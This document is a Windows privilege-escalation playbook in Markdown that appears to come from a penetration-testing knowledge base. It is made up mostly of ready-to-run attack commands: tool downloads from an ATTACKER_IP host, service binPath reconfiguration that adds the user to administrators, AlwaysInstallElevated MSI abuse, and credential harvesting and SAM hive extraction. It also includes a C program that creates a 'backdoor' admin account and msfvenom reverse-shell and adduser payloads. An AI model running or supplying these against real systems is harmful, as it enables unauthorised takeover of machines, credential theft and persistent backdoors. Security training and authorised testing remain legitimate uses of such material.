# Windows Privilege Escalation Methodology

End-to-end Windows local privilege escalation playbook: situational awareness → automated triage → token/privilege abuse → service/registry/scheduled-task misconfig → credential harvesting → SYSTEM. Grounded in current (2025-2026) tradecraft. Deep dives live in the sibling files: `windows-services-and-registry.md`, `token-and-potato-attacks.md`, `uac-bypass-and-lolbas.md`, and `impacket-reference.md`.

> The fastest Windows privesc is almost always **`whoami /priv` → SeImpersonatePrivilege → a Potato → SYSTEM**, or a credential you found being reused. Service/registry misconfigs come next. Kernel exploits are the last resort.

---

## 0. The Mental Model

| Trust boundary | What you abuse | Examples |
|----------------|----------------|----------|
| **Token privilege** | A privilege grants SYSTEM | SeImpersonate (Potatoes), SeDebug, SeBackup/Restore, SeTakeOwnership, SeLoadDriver |
| **Service config** | A service runs as SYSTEM and you can influence its binary | weak service ACL, unquoted path, writable binary, weak registry ACL, `binPath=` reconfig |
| **DLL search order** | A privileged process loads your DLL | DLL hijacking / proxying, PATH dir DLL planting |
| **Scheduled task** | Task runs as SYSTEM/admin, you control its target | writable task binary/script |
| **AutoRun / installer** | Elevated execution at logon/install | AutoLogon creds, `AlwaysInstallElevated`, Run keys |
| **Credentials at rest** | Reuse for a higher principal | LSASS, SAM, DPAPI, creds in registry/files, vault, browsers |
| **UAC** | Admin-in-token but medium IL → high IL | UAC bypass (fodhelper, etc.) |
| **Kernel / driver CVE** | Memory bug → SYSTEM | PrintNightmare, vulnerable signed drivers (BYOVD) |

Every section maps to one of these.

---

## 1. Situational Awareness

```powershell
whoami /all                      # user, groups, privileges, integrity level — read ALL of it
whoami /priv                     # privileges (the money line)
whoami /groups                   # group SIDs + integrity level (Medium vs High)
echo %USERNAME% & hostname
systeminfo                       # OS, build, hotfixes (for kernel CVE matching)
[System.Environment]::OSVersion.Version
wmic qfe get HotFixID            # installed patches
```

Key things to read off `whoami /all`:
- **Integrity level**: `Mandatory Label\Medium` = limited admin (UAC), `High` = elevated, `System` = done. `Medium` + "Administrators" group present but disabled → **UAC bypass** path.
- **Privileges**: any of `SeImpersonatePrivilege`, `SeAssignPrimaryTokenPrivilege`, `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, `SeManageVolumePrivilege` = a direct route (see `token-and-potato-attacks.md`).
- **Groups**: `BUILTIN\Administrators`, `Backup Operators`, `Server Operators`, `DnsAdmins`, `Hyper-V Administrators`, `Print Operators` — several are SYSTEM-equivalent.

```powershell
# Users / groups / sessions
net user; net user %USERNAME%
net localgroup; net localgroup administrators
Get-LocalGroupMember Administrators
query user; qwinsta                              # other logged-on sessions
# Network
ipconfig /all; route print; arp -a
netstat -ano | findstr LISTENING                 # loopback-only services = pivot targets
# AV / EDR present?
Get-MpComputerStatus | select RealTimeProtectionEnabled,AMServiceEnabled
sc query windefend; tasklist /svc | findstr /i "defender sense crowd carbon sentinel cylance"
```

---

## 2. Automated Triage

Run a scanner, then confirm findings by hand. WinPEAS and PrivescCheck are the standards; PowerUp for quick service/registry checks.

### WinPEAS
```cmd
:: Download/serve from attacker, fetch over HTTP
certutil -urlcache -split -f http://ATTACKER_IP/winPEASx64.exe %TEMP%\wp.exe
%TEMP%\wp.exe > %TEMP%\wp.txt
:: BAT/PS variants if no exec allowed
```
```powershell
iwr http://ATTACKER_IP/winPEASx64.exe -OutFile $env:TEMP\wp.exe; & $env:TEMP\wp.exe
```

### PrivescCheck (PowerShell, clean output)
```powershell
powershell -ep bypass
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT,HTML
```

### PowerUp (fast targeted)
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
Get-ModifiableServiceFile          # services with writable binaries
Get-ModifiableService              # services you can reconfigure
Get-UnquotedService
Get-ModifiableScheduledTaskFile
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
```

### Seatbelt (host survey)
```powershell
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=user
```

---

## 3. Token Privilege & Group Abuse (fastest wins)

Full detail in **`token-and-potato-attacks.md`**. Quick map:

```powershell
whoami /priv
```

| Privilege / Group | Route to SYSTEM |
|-------------------|-----------------|
| **SeImpersonatePrivilege** / SeAssignPrimaryTokenPrivilege | **Potato** family (PrintSpoofer, GodPotato, RoguePotato, EfsPotato, DCOMPotato, SigmaPotato) → SYSTEM |
| **SeDebugPrivilege** | Open/inject any process (LSASS dump, migrate to SYSTEM proc) |
| **SeBackupPrivilege** (Backup Operators) | Read SAM/SYSTEM/SECURITY or NTDS via shadow copy → offline hashes |
| **SeRestorePrivilege** | Overwrite protected files / service binaries |
| **SeTakeOwnershipPrivilege** | Take ownership of a SYSTEM binary, replace it |
| **SeLoadDriverPrivilege** | Load a vulnerable driver (BYOVD) → kernel |
| **SeManageVolumePrivilege** | Gain write to C:\ root → DLL/binary plant |
| **DnsAdmins** | Serve malicious DLL via `dnscmd /config /serverlevelplugindll` → SYSTEM on DC |

```powershell
:: Most common one-liner once you have SeImpersonate:
PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
```

---

## 4. Service Misconfigurations

Full detail in **`windows-services-and-registry.md`**. Vectors: insecure service ACL (reconfigure `binPath`), writable service executable, unquoted service path, weak service-registry ACL, weak DACL on service binary directory.

```powershell
# Enumerate services with non-default binary paths
Get-CimInstance win32_service | Select Name,State,StartName,PathName |
  Where-Object {$_.PathName -notlike 'C:\Windows\*'} | Format-Table -Auto

# Quick wins from PowerUp:
Get-ModifiableService; Get-ModifiableServiceFile; Get-UnquotedService

# Check who can reconfigure a service (look for SERVICE_CHANGE_CONFIG / WRITE_DAC):
accesschk.exe -accepteula -uwcqv "Authenticated Users" *
accesschk.exe -accepteula -uwcqv %USERNAME% *
sc.exe qc <ServiceName>; sc.exe sdshow <ServiceName>
```

Exploit pattern (reconfigure binPath):
```cmd
sc config <Svc> binPath= "C:\Windows\System32\cmd.exe /c net localgroup administrators %USERNAME% /add" start= auto
sc stop <Svc> & sc start <Svc>
```

---

## 5. Registry, AutoRun & Installer Vectors

```powershell
# AlwaysInstallElevated (MSI runs as SYSTEM) — both keys must be 1
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# Exploit:
msiexec /quiet /qn /i evil.msi    # evil.msi adds admin (msfvenom -f msi)

# AutoLogon creds in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"

# Run / RunOnce keys with writable targets
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Weak service registry ACL (write to ImagePath)
accesschk.exe -accepteula -kvuqsw "Authenticated Users" hklm\System\CurrentControlSet\Services
```

---

## 6. Scheduled Tasks

```powershell
schtasks /query /fo LIST /v | findstr /i "TaskName Run As User Task To Run"
Get-ScheduledTask | Where State -eq Ready | Select TaskName,@{n='Run';e={$_.Principal.UserId}}
# For tasks running as SYSTEM/admin, check write access to the action's program/script:
icacls "C:\path\to\task.exe"
Get-ModifiableScheduledTaskFile     # PowerUp
```
If the task target is writable → replace it with your payload → wait/trigger.

---

## 7. DLL Hijacking

Full detail in `windows-services-and-registry.md`. Find a privileged process that loads a DLL from a writable/missing location.
```powershell
# Writable directories in PATH (plant DLL there for processes that search PATH)
$env:PATH -split ';' | % { if (Test-Path $_) { icacls $_ 2>$null } } | findstr /i "Everyone Users Modify (M) (F) (W)"
# Use Procmon (filter: Result = NAME NOT FOUND, Path ends .dll) to find missing DLLs in a SYSTEM process.
```

---

## 8. Credential Harvesting

```powershell
# Files
Get-ChildItem C:\ -Recurse -Include *.kdbx,*.config,*.xml,unattend.xml,sysprep.inf,web.config,*.rdg -EA 0
findstr /si password *.txt *.ini *.config *.xml 2>nul
Get-ChildItem C:\Users\ -Recurse -Include *.txt,*.kdbx,*.ppk,id_rsa -EA 0

# PowerShell history (very high yield)
type "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

# Registry secrets
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
:: VNC, PuTTY, OpenSSH, WinSCP, FileZilla creds in registry/profile

# Unattend / GPP / WSL
type C:\Windows\Panther\Unattend.xml; type C:\Windows\System32\sysprep\sysprep.xml
findstr /si cpassword \\domain\SYSVOL\*.xml      # GPP (domain)

# Tooling
.\lazagne.exe all                                # browsers, wifi, vaults, etc.
.\SharpDPAPI.exe triage                          # DPAPI-protected creds
.\Seatbelt.exe -group=credentials
```

After finding a password, **reuse it**: try `runas`, `net use`, WinRM, RDP, and pass-the-hash if you got a hash. See `08-active-directory/` and `07-password-attacks/`.

### Local hash extraction (need admin or SeBackup)
```cmd
reg save HKLM\SAM %TEMP%\sam & reg save HKLM\SYSTEM %TEMP%\system & reg save HKLM\SECURITY %TEMP%\security
:: exfil and parse offline:
impacket-secretsdump -sam sam -system system -security security LOCAL
```

---

## 9. UAC Bypass (Medium → High integrity)

If you are a local admin running at Medium IL (UAC), bypass to High. Full catalog in **`uac-bypass-and-lolbas.md`**.
```powershell
whoami /groups | findstr /i "S-1-16-8192"   # Medium IL
:: Common fileless bypasses (auto-elevating binaries + hijacked registry):
:: fodhelper, computerdefaults, sdclt, eventvwr, computerdefaults, slui
```

---

## 10. Kernel & Driver Exploits (last resort)

```powershell
systeminfo                                   # OS build + hotfixes
wmic qfe get HotFixID
# Windows Exploit Suggester - Next Gen:
# wesng:  python wes.py systeminfo.txt
```

| CVE | Name | Target |
|-----|------|--------|
| CVE-2021-1675 / CVE-2021-34527 | **PrintNightmare** | Print Spooler RCE/LPE |
| CVE-2021-36934 | **HiveNightmare/SeriousSAM** | World-readable SAM/SYSTEM |
| CVE-2022-21882 / CVE-2021-1732 | win32k LPE | Win10/11 |
| CVE-2023-21768 | afd.sys LPE | Win11 22H2 |
| CVE-2024-30088 | ntoskrnl TOCTOU LPE | various |
| BYOVD | vulnerable signed driver (e.g. via SeLoadDriver / loaded by admin) | kernel SYSTEM |

```powershell
# HiveNightmare quick check (no admin needed):
icacls C:\Windows\System32\config\SAM    # if 'BUILTIN\Users:(I)(RX)' => readable!
:: read via shadow copy: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\System32\config\SAM
```

---

## 11. Payloads & Cross-Compilation

```c
// service/payload that adds an admin (add_admin.c)
#include <stdlib.h>
int main(){
  system("net user backdoor P@ssw0rd123! /add");
  system("net localgroup administrators backdoor /add");
  return 0;
}
```
```bash
# Cross-compile from Kali:
x86_64-w64-mingw32-gcc add_admin.c -o add_admin.exe
x86_64-w64-mingw32-gcc -shared payload.c -o payload.dll      # DLL
# msfvenom alternatives:
msfvenom -p windows/x64/exec CMD='net localgroup administrators u /add' -f exe -o s.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o p.dll
msfvenom -p windows/adduser USER=bk PASS=P@ss123! -f msi -o evil.msi
```

---

## 12. File Transfer (reference)

```powershell
iwr http://ATTACKER_IP/file -OutFile C:\Windows\Temp\file
certutil -urlcache -split -f http://ATTACKER_IP/file out.exe
# SMB (impacket-smbserver on attacker):
copy \\ATTACKER_IP\share\file C:\Windows\Temp\
# Base64 inline:
[IO.File]::WriteAllBytes("out.exe",[Convert]::FromBase64String("BASE64"))
```

---

## 13. Cheatsheet

```cmd
:: TRIAGE
whoami /all & whoami /priv
systeminfo & wmic qfe get HotFixID

:: AUTO
winPEASx64.exe
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"

:: TOKEN -> SYSTEM (if SeImpersonate)
PrintSpoofer64.exe -i -c cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"

:: SERVICE RECONFIG
accesschk.exe -uwcqv "Authenticated Users" *
sc config Svc binPath= "cmd /c net localgroup administrators %USERNAME% /add" & sc stop Svc & sc start Svc

:: ALWAYSINSTALLELEVATED
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi

:: CREDS
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query HKLM /f password /t REG_SZ /s
lazagne.exe all

:: HASHES (admin)
reg save HKLM\SAM sam & reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

### Decision flow
1. `whoami /all` → privilege/group/IL read.
2. SeImpersonate? → Potato → SYSTEM (done).
3. Other dangerous privilege/group? → use it (`token-and-potato-attacks.md`).
4. Run WinPEAS/PowerUp; verify service & registry misconfigs by hand.
5. AlwaysInstallElevated / AutoLogon / writable service or task? → exploit.
6. Hunt credentials (history, registry, files, DPAPI, LSASS) → reuse.
7. Admin@Medium IL? → UAC bypass.
8. Nothing? → match build/hotfixes → kernel CVE / BYOVD.

---

## References

- HackTricks – Windows Local Privilege Escalation — https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- PEASS-ng (WinPEAS) — https://github.com/peass-ng/PEASS-ng
- PrivescCheck — https://github.com/itm4n/PrivescCheck
- PowerSploit/PowerUp — https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
- Seatbelt / GhostPack — https://github.com/GhostPack/Seatbelt
- LOLBAS Project — https://lolbas-project.github.io/
- WES-NG (Windows Exploit Suggester NG) — https://github.com/bitsadmin/wesng
- InternalAllTheThings – Windows Privesc — https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/
